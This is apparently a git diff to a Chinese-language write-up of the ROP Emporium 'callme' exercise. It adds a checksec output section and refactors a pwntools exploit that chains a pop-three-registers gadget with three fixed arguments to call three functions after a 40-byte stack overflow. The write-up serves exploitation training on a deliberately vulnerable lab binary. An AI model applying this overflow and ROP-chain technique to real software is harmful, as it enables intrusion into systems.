@@ -20,7 +20,26 @@ series: ROP Emporium
 
 ## 工具
 
+pwntools
+
 ~~好像都用不上啥工具呢~~
+
+## 检查二进制文件权限
+
+指令和结果放在一起看吧
+
+```terminal
+pwn checksec ./callme
+[*] '/home/jerry/leeshang/ROP Emporium/callme/callme'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RUNPATH:  b'.'
+```
+
+~~象征性地看一看~~
 
 ## 查反汇编，确定函数地址，找有用gadget
 
@@ -66,11 +85,18 @@ from pwn import *
 p = process('./callme')
 p.recv() 
 
+gadget_pop3 = 0x40093c
+callme_one = 0x400720
+callme_two = 0x400740
+callme_three = 0x4006f0
+
+args = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
+
 payload = b'A' * 40
-payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x0000000000400720)
-payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x0000000000400740)
-payload += p64(0x000000000040093c) +p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(0x00000000004006f0)
-#从左到右依次是gadget(pop三个参数寄存器)、三个参数以及目标函数(callme_num)，以此为结构排三个对应各个目标函数
+payload += p64(gadget_pop3) + args + p64(callme_one)
+payload += p64(gadget_pop3) + args + p64(callme_two)
+payload += p64(gadget_pop3) + args + p64(callme_three)
+
 p.sendline(payload)
 p.interactive()
 ```
